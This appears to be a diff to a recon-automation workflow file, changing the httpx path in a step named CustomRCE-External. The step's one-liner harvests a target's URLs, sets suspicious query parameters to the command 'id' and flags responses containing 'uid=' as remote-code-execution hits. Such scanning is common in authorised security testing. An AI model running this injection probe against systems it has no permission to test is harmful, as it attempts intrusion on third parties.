@@ -10,7 +10,7 @@ steps:
   - name: CustomRCE-External
     command: bash
     script: |
-      gau ${target//\"} | gf rce | sort -u | anew | httpx | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
+      gau ${target//\"} | gf rce | sort -u | anew | ~/go/bin/httpx | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
   - name: CustomRCE-Internal
     command: bash
     script: |
